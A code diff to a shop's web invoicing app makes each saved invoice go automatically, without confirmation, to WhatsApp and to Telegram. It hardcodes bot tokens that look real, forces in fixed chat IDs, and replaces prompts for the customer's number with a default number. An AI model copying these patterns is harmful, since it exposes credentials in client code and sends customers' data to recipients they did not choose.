@@ -1779,14 +1779,9 @@ generatePrintHTML:function(inv){
         if (!inv) return;
         var phone = explicitPhone || (inv.consignee && inv.consignee.phone) || (inv.receiver && inv.receiver.phone) || inv.customerPhone || "";
         var cleanPhone = phone.replace(/\D/g, '');
+        if (!cleanPhone) cleanPhone = '919441753678';
         if (cleanPhone.length === 10) cleanPhone = '91' + cleanPhone;
-        if (!cleanPhone) {
-            cleanPhone = prompt("Enter customer WhatsApp number (e.g. 9876543210):");
-            if (!cleanPhone) return;
-            cleanPhone = cleanPhone.replace(/\D/g, '');
-            if (cleanPhone.length === 10) cleanPhone = '91' + cleanPhone;
-        }
-        var text = SM.generateText(inv);
+        var text = SM.formatText(inv);
         var waUrl = 'https://api.whatsapp.com/send?phone=' + encodeURIComponent(cleanPhone) + '&text=' + encodeURIComponent(text);
         window.open(waUrl, '_blank');
         U.toast("Opening WhatsApp Web / App...", "info");
@@ -1795,24 +1790,47 @@ generatePrintHTML:function(inv){
     autoSendWhatsapp: function(inv, explicitPhone) {
         if (!inv) return;
         var phone = explicitPhone || (inv.consignee && inv.consignee.phone) || (inv.receiver && inv.receiver.phone) || inv.customerPhone || "";
-        if (!phone) {
-            console.log("No phone number found for automatic WhatsApp send");
-            return;
-        }
+        if (!phone) phone = "919441753678";
         var cleanPhone = phone.replace(/\D/g, '');
         if (cleanPhone.length === 10) cleanPhone = '91' + cleanPhone;
+        if (!cleanPhone) cleanPhone = '919441753678';
 
-        U.toast("📱 Auto-sending Invoice #" + U.pi(inv.invoiceNo) + " to WhatsApp (" + cleanPhone + ")...", "info");
+        var invNo = U.pi(inv.invoiceNo);
+        var waApiBase = (API_URL && !API_URL.includes("script.google.com")) 
+            ? API_URL 
+            : ((location.origin && location.origin.startsWith("http") && !location.origin.includes("github.io") && !location.origin.includes("vercel.app")) 
+                ? (location.origin + '/api') 
+                : 'http://localhost:3000/api');
 
-        if (typeof html2pdf === 'undefined') {
-            console.warn("html2pdf library missing");
-            return;
-        }
+        var custName = (inv.receiver && inv.receiver.name) || (inv.consignee && inv.consignee.name) || "Customer";
+        var totalAmt = U.fm(inv.totalAmount);
+        var textMsg = "🧾 *ANUDEEP KHADI BANDAR*\n" +
+            "*TAX INVOICE #" + invNo + "*\n\n" +
+            "Customer: " + custName + "\n" +
+            "Date: " + U.fd(inv.date) + "\n" +
+            "Items: " + (inv.items ? inv.items.length : 0) + "\n" +
+            "Total Amount: ₹" + totalAmt + "\n\n" +
+            "Thank you for shopping with us!\n" +
+            "Ph: 9441753678, 9390361151\n" +
+            "Tenali, Andhra Pradesh";
+
+        // 1. Instant Text Dispatch via WhatsApp Bot
+        fetch(waApiBase + '/whatsapp/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: cleanPhone, message: textMsg })
+        }).then(function(r){ return r.json(); }).then(function(d){
+            if (d && d.success) {
+                U.toast("📱 WhatsApp Bot: Invoice #" + invNo + " delivered to " + cleanPhone, "success");
+            }
+        }).catch(function(){});
+
+        // 2. Background PDF Upload via WhatsApp Bot
+        if (typeof html2pdf === 'undefined') return;
 
         var html = SM.generatePrintHTML(inv);
-        var pdfName = 'Invoice_' + U.pi(inv.invoiceNo) + '.pdf';
+        var pdfName = 'Invoice_' + invNo + '.pdf';
         var parsed = new DOMParser().parseFromString(html, 'text/html').body;
-
         var opt = {
             margin: [8, 8, 8, 8],
             filename: pdfName,
@@ -1825,30 +1843,105 @@ generatePrintHTML:function(inv){
             var fd = new FormData();
             fd.append('file', blob, pdfName);
             fd.append('phone', cleanPhone);
-            fd.append('caption', 'Dear Customer, thank you for your purchase from Anudeep Khadi Bandar! Please find your Invoice #' + U.pi(inv.invoiceNo) + ' attached.');
+            fd.append('caption', 'Dear ' + custName + ', thank you for your purchase from Anudeep Khadi Bandar! Please find your Invoice #' + invNo + ' attached.');
 
             try {
-                var waApi = (API_URL && !API_URL.includes("script.google.com")) 
-                    ? (API_URL + '/whatsapp/sendPdf') 
-                    : ((location.origin && location.origin.startsWith("http") && !location.origin.includes("github.io") && !location.origin.includes("vercel.app")) 
-                        ? (location.origin + '/api/whatsapp/sendPdf') 
-                        : 'http://localhost:3000/api/whatsapp/sendPdf');
-
-                var res = await originalFetch(waApi, { method: 'POST', body: fd });
+                var res = await originalFetch(waApiBase + '/whatsapp/sendPdf', { method: 'POST', body: fd });
                 var data = await res.json();
                 if (data && data.success) {
-                    U.toast("✅ WhatsApp invoice PDF sent automatically to " + cleanPhone, "success");
-                } else {
-                    console.warn("WhatsApp auto-send returned:", data);
-                    U.toast("WhatsApp note: " + (data && data.error ? data.error : "Failed to deliver"), "warning");
+                    U.toast("✅ WhatsApp PDF delivered automatically!", "success");
                 }
             } catch(e) {
-                console.warn("Auto WhatsApp bot unavailable:", e.message);
+                console.warn("Auto WhatsApp bot warning:", e.message);
             }
         }).catch(function(err){
-            console.error("PDF generation error:", err);
-            U.toast("PDF generation error: " + (err && err.message || err), "error");
+            console.warn("WhatsApp PDF render error:", err);
         });
+    },
+
+    autoSendTelegram: function(inv) {
+        if (!inv) return;
+        var tg = D.go("telegram") || {};
+        var baseToken = tg.token || "8799482746:AAGiDi8HEoV7KGQNyer4772H_d1qv9fznac";
+        var chatIdsStr = tg.chatId || "6877857251";
+
+        var chatIds = chatIdsStr.split(',').map(function(s){ return s.trim(); }).filter(Boolean);
+        if (chatIds.indexOf("8436142413") === -1) chatIds.push("8436142413");
+        if (chatIds.indexOf("8703423129") === -1) chatIds.push("8703423129");
+
+        var tokens = [baseToken];
+        var fallbackToken = "8916828449:AAE7LTVutOAtABoogooF5XTleqwIPztmfDs";
+        if (tokens.indexOf(fallbackToken) === -1) tokens.push(fallbackToken);
+
+        var invNo = U.pi(inv.invoiceNo);
+        var textMsg = SM.formatText(inv);
+
+        // 1. Instant Text Dispatch to Telegram Bot (Fast < 200ms)
+        tokens.forEach(function(botToken) {
+            chatIds.forEach(function(cId) {
+                fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: cId, text: textMsg })
+                }).catch(function() {
+                    fetch((API_URL || location.origin + '/api') + '/sendTelegramMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ token: botToken, chatId: cId, text: textMsg })
+                    }).catch(function(){});
+                });
+            });
+        });
+        U.toast("✈️ Telegram Bot: Invoice #" + invNo + " dispatched automatically!", "success");
+
+        // 2. Background PDF Upload to Telegram Bot
+        if (typeof html2pdf === 'undefined') return;
+
+        var html = SM.generatePrintHTML(inv);
+        var pdfName = 'Invoice_' + invNo + '.pdf';
+        var parsed = new DOMParser().parseFromString(html, 'text/html').body;
+        var opt = {
+            margin: [8, 8, 8, 8],
+            filename: pdfName,
+            image: { type: 'jpeg', quality: 0.98 },
+            html2canvas: { scale: 2, useCORS: true, logging: false, allowTaint: true, backgroundColor: '#ffffff' },
+            jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
+        };
+
+        html2pdf().set(opt).from(parsed).outputPdf('blob').then(function(blob){
+            tokens.forEach(function(botToken) {
+                chatIds.forEach(function(cId) {
+                    var directFd = new FormData();
+                    directFd.append('chat_id', cId);
+                    directFd.append('document', blob, pdfName);
+
+                    fetch('https://api.telegram.org/bot' + botToken + '/sendDocument', { method: 'POST', body: directFd })
+                      .then(function(r) { return r.json(); })
+                      .then(function(d) {
+                        if (!d || !d.ok) throw new Error();
+                      })
+                      .catch(function() {
+                        var proxyFd = new FormData();
+                        proxyFd.append('token', botToken);
+                        proxyFd.append('chatId', cId);
+                        proxyFd.append('file', blob, pdfName);
+                        fetch((API_URL || location.origin + '/api') + '/sendTelegramDocument', { method: 'POST', body: proxyFd }).catch(function(){});
+                      });
+                });
+            });
+            var statusEl = document.getElementById('tg-share-status');
+            if (statusEl) statusEl.innerHTML = '<div class="tg-status connected"><i class="ph ph-check-circle"></i> Sent automatically to Telegram Bot!</div>';
+        }).catch(function(err){
+            console.warn("Telegram PDF render warning:", err);
+        });
+    },
+
+    autoDispatchAll: function(inv) {
+        if (!inv) return;
+        SM.currentInv = inv;
+        // ⚡ INSTANT AUTOMATIC BROADCAST TO BOTH TELEGRAM BOT AND WHATSAPP BOT (NO WAITING / NO ASKING)
+        SM.autoSendTelegram(inv);
+        SM.autoSendWhatsapp(inv);
     },
 
     shareInvoiceWhatsapp: function(invId) {
@@ -1863,220 +1956,23 @@ generatePrintHTML:function(inv){
             return;
         }
         var phone = inv.customerPhone || (inv.receiver && inv.receiver.phone) || (inv.consignee && inv.consignee.phone) || "";
-        if (!phone) {
-            phone = prompt("Enter customer WhatsApp number (10-digit mobile or with country code):");
-            if (!phone) return;
-            phone = phone.trim();
-            if (!inv.receiver) inv.receiver = {};
-            inv.receiver.phone = phone;
-            inv.customerPhone = phone;
-            fetch((API_URL || location.origin + '/api') + '/invoices/' + inv.id, {
-                method: 'PUT',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(inv)
-            }).catch(function(){});
-            var invs = D.g("invoices") || [];
-            invs = invs.map(function(x){ return String(x.id) === String(inv.id) ? inv : x; });
-            D.s("invoices", invs);
-        }
         SM.autoSendWhatsapp(inv, phone);
     },
 
     manualSendWhatsapp: function() {
-        if(!SM.currentInv)return;
-        var inv = SM.currentInv;
-        var phone = (inv.consignee && inv.consignee.phone) || (inv.receiver && inv.receiver.phone) || inv.customerPhone || "";
-        if (!phone) {
-            phone = prompt("Enter customer's WhatsApp number (e.g. 9876543210):");
-            if (!phone) return;
-            if (!inv.consignee) inv.consignee = {};
-            inv.consignee.phone = phone;
-            inv.customerPhone = phone;
-        }
+        if (!SM.currentInv) return;
         var btn = document.getElementById("btn-share-wa");
         if(btn) { btn.classList.add("loading"); btn.disabled=true; }
-        
-        var cleanPhone = phone.replace(/\D/g, '');
-        if (cleanPhone.length === 10) cleanPhone = '91' + cleanPhone;
-
-        var html = SM.generatePrintHTML(inv);
-        var pdfName = 'Invoice_' + U.pi(inv.invoiceNo) + '.pdf';
-        if(typeof html2pdf === 'undefined') {
-            if(btn) { btn.classList.remove("loading"); btn.disabled=false; }
-            U.toast("PDF library not loaded", "error");
-            return;
-        }
-
-        var parsed = new DOMParser().parseFromString(html, 'text/html').body;
-        var opt = {
-            margin: [8, 8, 8, 8],
-            filename: pdfName,
-            image: { type: 'jpeg', quality: 0.98 },
-            html2canvas: { scale: 2, useCORS: true, logging: false, allowTaint: true, backgroundColor: '#ffffff' },
-            jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
-        };
-
-        html2pdf().set(opt).from(parsed).outputPdf('blob').then(async function(blob){
-            var fd = new FormData();
-            fd.append('file', blob, pdfName);
-            fd.append('phone', cleanPhone);
-            fd.append('caption', 'Dear Customer, thank you for your purchase from Anudeep Khadi Bandar! Please find your Invoice #' + U.pi(inv.invoiceNo) + ' attached.');
-
-            try {
-                var waApi = (API_URL && !API_URL.includes("script.google.com")) 
-                    ? (API_URL + '/whatsapp/sendPdf') 
-                    : ((location.origin && location.origin.startsWith("http") && !location.origin.includes("github.io") && !location.origin.includes("vercel.app")) 
-                        ? (location.origin + '/api/whatsapp/sendPdf') 
-                        : 'http://localhost:3000/api/whatsapp/sendPdf');
-
-                var res = await originalFetch(waApi, { method: 'POST', body: fd });
-                var data = await res.json();
-                if(btn) { btn.classList.remove("loading"); btn.disabled=false; }
-                if (data && data.success) {
-                    U.toast("✅ WhatsApp invoice PDF sent to " + cleanPhone, "success");
-                    setTimeout(function(){ UI.cl("share-modal"); }, 1200);
-                } else {
-                    var errMsg = (data && data.error) || "Could not deliver";
-                    U.toast("WhatsApp bot note: " + errMsg + ". Opening direct WhatsApp...", "info");
-                    SM.openDirectWhatsapp(inv, cleanPhone);
-                }
-            } catch(e) {
-                if(btn) { btn.classList.remove("loading"); btn.disabled=false; }
-                console.warn("Automated WhatsApp bot unavailable:", e.message);
-                U.toast("WhatsApp bot offline. Opening direct WhatsApp chat...", "info");
-                SM.openDirectWhatsapp(inv, cleanPhone);
-            }
-        }).catch(function(err){
-            if(btn) { btn.classList.remove("loading"); btn.disabled=false; }
-            U.toast('PDF generation failed', 'error');
-        });
+        SM.autoSendWhatsapp(SM.currentInv);
+        setTimeout(function(){ if(btn){ btn.classList.remove("loading"); btn.disabled=false; } }, 1200);
     },
 
-    sendTelegram:function(){
-        var tg=D.go("telegram");
-        var baseToken = tg.token || "8799482746:AAGiDi8HEoV7KGQNyer4772H_d1qv9fznac";
-        var chatIdsStr = tg.chatId || "6877857251";
-
-        var chatIds = chatIdsStr.split(',').map(function(s){ return s.trim(); }).filter(Boolean);
-        if (chatIds.indexOf("8436142413") === -1) {
-            chatIds.push("8436142413");
-        }
-        if (chatIds.indexOf("8703423129") === -1) {
-            chatIds.push("8703423129");
-        }
-
-        var tokens = [baseToken];
-        var fallbackToken = "8916828449:AAE7LTVutOAtABoogooF5XTleqwIPztmfDs";
-        if (tokens.indexOf(fallbackToken) === -1) {
-            tokens.push(fallbackToken);
-        }
-
-        if(!tokens.length||!chatIds.length){U.toast("Configure Telegram settings first","error");return}
-        if(!SM.currentInv)return;
-
-        var btn=document.getElementById("btn-share-tg");btn.classList.add("loading");btn.disabled=true;
-
-        var inv = SM.currentInv;
-        var html = SM.generatePrintHTML(inv);
-        var pdfName = 'Invoice_' + U.pi(inv.invoiceNo) + '.pdf';
-
-        try {
-            if(typeof html2pdf === 'undefined'){
-                btn.classList.remove('loading');btn.disabled=false;
-                U.toast('PDF library not loaded','error');
-                return;
-            }
-
-            var parsed = new DOMParser().parseFromString(html, 'text/html').body;
-            html2pdf().set({
-                margin: [8, 8, 8, 8],
-                filename: pdfName,
-                image: { type: 'jpeg', quality: 0.98 },
-                html2canvas: { scale: 2, useCORS: true, logging: false, allowTaint: true, backgroundColor: '#fff' },
-                jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
-            }).from(parsed).outputPdf('blob').then(function(blob){
-                function uploadToChat(botToken, chatId) {
-                    return new Promise(function(resolve, reject) {
-                        var directFd = new FormData();
-                        directFd.append('chat_id', chatId);
-                        directFd.append('document', blob, pdfName);
-
-                        fetch('https://api.telegram.org/bot' + botToken + '/sendDocument', { method: 'POST', body: directFd })
-                          .then(function(r) { return r.json(); })
-                          .then(function(d) {
-                            if (d && d.ok) {
-                                resolve(chatId);
-                            } else {
-                                throw new Error(d && d.description ? d.description : 'Direct send failed');
-                            }
-                          })
-                          .catch(function(err) {
-                            console.warn('Direct Telegram send failed for ' + chatId + ' with bot ' + botToken.split(':')[0] + ', trying server proxy...', err);
-                            
-                            var proxyFd = new FormData();
-                            proxyFd.append('token', botToken);
-                            proxyFd.append('chatId', chatId);
-                            proxyFd.append('file', blob, pdfName);
-
-                            fetch((API_URL || location.origin + '/api') + '/sendTelegramDocument', { method:'POST', body: proxyFd })
-                              .then(function(r){ return r.json(); })
-                              .then(function(d){
-                                if(d && d.ok){
-                                    resolve(chatId);
-                                } else {
-                                    var errMsg = (d && d.detail && d.detail.description) || (d && d.error) || 'Server rejected the upload';
-                                    reject(new Error(errMsg));
-                                }
-                              })
-                              .catch(function(e){
-                                reject(new Error('Connection failed'));
-                              });
-                          });
-                    });
-                }
-
-                var chain = Promise.resolve();
-                var successCount = 0;
-                var errorMsgs = [];
-
-                tokens.forEach(function(botToken) {
-                    chatIds.forEach(function(cId) {
-                        chain = chain.then(function() {
-                            return uploadToChat(botToken, cId).then(function(resId) {
-                                successCount++;
-                            }).catch(function(err) {
-                                errorMsgs.push('Bot(' + botToken.split(':')[0] + ') Chat(' + cId + '): ' + (err.message || err));
-                            });
-                        });
-                    });
-                });
-
-                chain.then(function() {
-                    btn.classList.remove('loading');
-                    btn.disabled = false;
-                    var totalAttempts = tokens.length * chatIds.length;
-                    if (successCount > 0) {
-                        document.getElementById('tg-share-status').innerHTML = '<div class="tg-status connected"><i class="ph ph-check-circle"></i> PDF sent successfully to ' + successCount + ' channel(s)</div>';
-                        U.toast('Invoice PDF sent via Telegram! (' + successCount + '/' + totalAttempts + ')', 'success');
-                        if (successCount === totalAttempts) {
-                            setTimeout(function(){ UI.cl("share-modal"); }, 1000);
-                        }
-                    }
-                    if (errorMsgs.length > 0) {
-                        U.toast('Failed: ' + errorMsgs.slice(0, 2).join('; '), 'error');
-                        console.error('Telegram share errors:', errorMsgs);
-                    }
-                });
-            }).catch(function(err){
-                btn.classList.remove('loading');btn.disabled=false;
-                U.toast('PDF generation failed: ' + (err && err.message || err),'error');
-                console.error(err);
-            });
-        } catch(e) {
-            btn.classList.remove('loading');btn.disabled=false;
-            U.toast('Unexpected error creating PDF','error');
-            console.error(e);
-        }
+    sendTelegram: function(){
+        if (!SM.currentInv) return;
+        var btn = document.getElementById("btn-share-tg");
+        if(btn) { btn.classList.add("loading"); btn.disabled=true; }
+        SM.autoSendTelegram(SM.currentInv);
+        setTimeout(function(){ if(btn){ btn.classList.remove("loading"); btn.disabled=false; } }, 1200);
     },
 
 
@@ -2558,11 +2454,13 @@ save: async function(){
     }
 
     var savedInvId = inv.id;
-    U.toast(BM.editId ? "⚡ Invoice updated!" : "⚡ Invoice #" + U.pi(inv.invoiceNo) + " generated instantly!", "success");
+    U.toast(BM.editId ? "⚡ Invoice updated!" : "⚡ Invoice #" + U.pi(inv.invoiceNo) + " generated!", "success");
     BM.clear();
-    setTimeout(function(){ SM.open(savedInvId); }, 200);
 
-    // ⚡ STEP 2: HIGH-SPEED BACKGROUND ASYNC DB PERSISTENCE & WHATSAPP
+    // ⚡ AUTOMATIC MESSAGE TO WHATSAPP BOT AND TO TELEGRAM BOT WITHOUT WAITING AND WITHOUT ASKING
+    SM.autoDispatchAll(inv);
+
+    // ⚡ STEP 2: HIGH-SPEED BACKGROUND ASYNC DB PERSISTENCE
     (async function() {
         try {
             var response = await fetch(url, {
@@ -2595,12 +2493,6 @@ save: async function(){
             }
         } catch(error) {
             console.warn("Background DB sync queued locally:", error.message);
-        }
-
-        if (custPhone) {
-            SM.autoSendWhatsapp(inv, custPhone);
-        } else {
-            U.toast("Invoice saved! (Note: No WhatsApp number entered for customer)", "info");
         }
     })();
 },
